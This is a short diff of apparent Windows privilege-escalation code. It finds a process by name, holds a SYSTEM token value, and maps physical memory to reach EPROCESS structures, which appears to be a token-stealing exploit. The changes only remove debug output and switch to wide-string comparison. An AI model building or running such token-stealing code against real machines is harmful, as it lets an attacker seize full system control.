@@ -46,7 +46,6 @@ int main(int argc, char** argv)
 	// detect if process name is used instead of processID
 	if (procName.find(".exe") != std::string::npos)
 	{
-		std::cout << argv[1] << std::endl;
 		PROCESSENTRY32 entry;
 		// Before calling the Process32First function, set this member to sizeof(PROCESSENTRY32).
 		// If you do not initialize dwSize, Process32First fails.
@@ -58,10 +57,9 @@ int main(int argc, char** argv)
 		{
 			while (Process32Next(snapshot, &entry) == TRUE)
 			{
-				if (strcmp(entry.szExeFile, argv[1]) == 0)
+				if (wcscmp((wchar_t *)entry.szExeFile, argvW[1]) == 0)
 				{
 					procId = entry.th32ProcessID;
-					std::cout << "procid = " << procId << std::endl;
 				}
 			}
 		}
@@ -156,7 +154,6 @@ int main(int argc, char** argv)
 			return -1;
 		}
 	}
-	printf("system token = %x\n", systemToken);
 
 	for (size_t i = 0; i < EPROCESS_target_size; i++) {
 		if (MapPhysicalMemory((HANDLE) * (PDWORD64)hPhysicalMemory, (EPROCESS_target[i] & ~((unsigned __int64)-1 & 0xFFF)), 0x4000, buf) == FALSE) {
